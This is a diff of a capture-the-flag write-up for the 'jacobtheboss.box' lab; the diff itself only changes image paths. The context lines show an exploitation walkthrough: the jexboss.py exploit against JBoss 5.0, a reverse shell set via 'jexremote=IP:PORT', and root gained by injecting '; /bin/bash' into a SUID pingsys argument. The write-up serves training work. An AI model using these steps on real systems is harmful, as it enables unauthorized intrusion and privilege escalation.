@@ -34,11 +34,11 @@ echo 'IP jacobtheboss.box' | sudo tee -a /etc/hosts
 ---
 
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020250408162521.png)
+![](cybersecurity/images/Pasted%2520image%252020250408162521.png)
 
 Web application located at port 80 contains an admin login page and some other functionalities, I tried `XSS` on the search bar but it didn't work, I also tried `LFI` but same happened, seems like this is not the intended path to take, now, if we remember correctly, we got another website located at port 8080:
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020250408162626.png)
+![](cybersecurity/images/Pasted%2520image%252020250408162626.png)
 
 We got something called `Jboss`, if we check the version:
 
@@ -50,7 +50,7 @@ http://jacobtheboss.box:8080 [200 OK] Apache, Country[RESERVED][ZZ], HTTPServer[
 
 We are dealing with `JBoss 5.0`, if we search for an exploit, we can find this:
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020250408162907.png)
+![](cybersecurity/images/Pasted%2520image%252020250408162907.png)
 
 We got `RCE`, let's proceed to exploitation phase.
 
@@ -74,7 +74,7 @@ python jexboss.py -host http://jacobtheboss.box:8080
 
 We can see this:
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020250408163415.png)
+![](cybersecurity/images/Pasted%2520image%252020250408163415.png)
 
 There we go, we got the shell, as it says in the script, to get a reverse shell, we can simply type the following:
 
@@ -84,7 +84,7 @@ jexremote=IP:PORT
 
 If we check our listener:
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020250408163529.png)
+![](cybersecurity/images/Pasted%2520image%252020250408163529.png)
 
 We got the connection, let's start the privilege escalation phase.
 
@@ -104,7 +104,7 @@ export TERM=xterm
 export BASH=bash
 ```
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020250408163630.png)
+![](cybersecurity/images/Pasted%2520image%252020250408163630.png)
 
 We can read user flag now:
 
@@ -141,7 +141,7 @@ If we check for SUID 4000 binaries, we find this:
 
 We got a few that may be interesting but after testing all of them, the only one that I could find some info was `pingsys`
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020250408164534.png)
+![](cybersecurity/images/Pasted%2520image%252020250408164534.png)
 
 Which means that in order to get root, we can do the following:
 
@@ -149,7 +149,7 @@ Which means that in order to get root, we can do the following:
 /usr/bin/pingsys '127.0.0.1; /bin/bash'
 ```
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020250408164651.png)
+![](cybersecurity/images/Pasted%2520image%252020250408164651.png)
 
 There we go, we got the root shell and can finally read `root.txt`:
 
@@ -158,5 +158,5 @@ There we go, we got the root shell and can finally read `root.txt`:
 29a5641eaa0c01abe5749608c8232806
 ```
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020250408164733.png)
+![](cybersecurity/images/Pasted%2520image%252020250408164733.png)
 
